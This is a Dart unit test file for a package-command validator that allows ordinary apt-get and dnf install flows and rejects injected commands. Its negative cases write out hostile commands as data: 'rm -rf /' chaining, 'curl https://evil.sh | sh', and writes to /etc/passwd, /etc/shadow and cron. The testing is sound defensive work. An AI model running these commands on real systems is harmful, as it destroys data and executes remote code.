import 'package:flutter_test/flutter_test.dart';
import 'package:dev_stack/features/apps/data/package_command_validator.dart';

void main() {
  group('PackageCommandValidator', () {
    group('catalog commands (positive cases)', () {
      test('accepts all ubuntu php85 commands from the real catalog', () {
        final commands = [
          'sudo apt-get update',
          'sudo apt-get install -y software-properties-common',
          'sudo add-apt-repository -y ppa:ondrej/php',
          'sudo apt-get update',
          'sudo apt-get install -y php8.5-fpm php8.5-cli php8.5-common',
        ];
        expect(PackageCommandValidator.validateAll(commands), isEmpty);
      });

      test('accepts debian sury.org flow with pipeline to tee', () {
        final commands = [
          'sudo apt-get update',
          'curl -sSLo /tmp/keyring.deb https://packages.sury.org/debsuryorg-archive-keyring.deb',
          'sudo dpkg -i /tmp/keyring.deb',
          'echo "deb [signed-by=/usr/share/keyrings/k.gpg] https://packages.sury.org/php/ bookworm main" '
              '| sudo tee /etc/apt/sources.list.d/php.list',
          'sudo apt-get install -y php8.2-cli',
        ];
        expect(PackageCommandValidator.validateAll(commands), isEmpty);
      });

      test('accepts centos dnf remi flow', () {
        final commands = [
          'sudo dnf install -y epel-release',
          'sudo dnf install -y https://rpms.remirepo.net/enterprise/remi-release-9.rpm',
          'sudo dnf module reset -y php',
          'sudo dnf module enable -y php:remi-8.4',
        ];
        expect(PackageCommandValidator.validateAll(commands), isEmpty);
      });
    });

    group('rejected commands (negative cases)', () {
      test('rejects unknown leading binary', () {
        expect(
          PackageCommandValidator.validate('evil-binary --arg'),
          contains('not in the allowed list'),
        );
      });

      test('rejects arbitrary binaries smuggled after sudo', () {
        expect(
          PackageCommandValidator.validate('sudo /tmp/payload.sh'),
          anyOf(contains('not in the allowed list'), contains('not in the allowed system directories')),
        );
      });

      test('rejects command substitution', () {
        expect(
          PackageCommandValidator.validate(r'echo $(whoami)'),
          contains('Forbidden pattern'),
        );
        expect(
          PackageCommandValidator.validate('echo `whoami`'),
          contains('Forbidden pattern'),
        );
      });

      test('rejects chained commands', () {
        expect(
          PackageCommandValidator.validate('apt-get update; rm -rf /'),
          contains('Forbidden pattern'),
        );
        expect(
          PackageCommandValidator.validate('apt-get update && rm -rf /'),
          contains('Forbidden pattern'),
        );
        expect(
          PackageCommandValidator.validate('true || curl evil.sh'),
          contains('Forbidden pattern'),
        );
      });

      test('rejects file redirection that could overwrite system files', () {
        expect(
          PackageCommandValidator.validate('echo x > /etc/passwd'),
          contains('Forbidden pattern'),
        );
      });

      test('rejects piped shell execution (curl | sh)', () {
        // 'sh' is not in the allowlist, so the second pipeline segment fails
        expect(
          PackageCommandValidator.validate('curl https://evil.sh | sh'),
          contains('not in the allowed list'),
        );
      });

      test('rejects empty command and empty pipeline segment', () {
        expect(PackageCommandValidator.validate(''), isNotNull);
        expect(PackageCommandValidator.validate('  '), isNotNull);
        expect(PackageCommandValidator.validate('apt-get update |'), isNotNull);
      });

      test('rejects tee targeting sensitive system files', () {
        expect(
          PackageCommandValidator.validate('echo evil | sudo tee /etc/cron.d/evil'),
          contains('not allowed'),
        );
        expect(
          PackageCommandValidator.validate('echo evil | tee /etc/shadow'),
          contains('not allowed'),
        );
        expect(
          PackageCommandValidator.validate('echo evil | tee /etc/passwd'),
          contains('not allowed'),
        );
      });

      test('rejects dangerous paths smuggled as binaries', () {
        expect(
          PackageCommandValidator.validate('/tmp/evil_tool'),
          anyOf(contains('not in the allowed list'), contains('not in the allowed system directories')),
        );
        expect(
          PackageCommandValidator.validate('sudo /tmp/evil_tool'),
          anyOf(contains('not in the allowed list'), contains('not in the allowed system directories')),
        );
      });
    });
  });
}
